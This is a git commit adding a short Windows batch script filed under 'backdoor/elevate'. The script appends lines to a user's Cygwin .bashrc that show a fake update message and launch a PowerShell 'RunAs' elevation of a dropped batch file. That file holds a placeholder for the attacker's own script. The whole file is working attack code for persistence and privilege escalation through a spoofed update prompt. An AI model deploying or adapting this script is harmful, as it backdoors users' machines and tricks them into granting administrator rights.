463bf60ae4930d39cc61f7f2295b85160a01e936
Cervoise <antoine.cervoise@gmail.com>
2018-10-17 16:05:30 +0200

    Create Cygwin32-RunAsPowershell.bat

---
+++ backdoor/elevate/Cygwin32-RunAsPowershell.bat
@@ -0,0 +1,6 @@
+cd ..\..\Cygwin\home\%USERNAME%
+echo echo "Cygwin must check for update!" >> .bashrc
+echo /cygdrive/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process %USERPROFILE%\CygwinUpdate.bat -Verb RunAs" >> .bashrc
+echo echo "Cygwin updated!" >> .bashrc
+cd %USERPROFILE%
+echo yourEvilScript > CygwinUpdate.bat
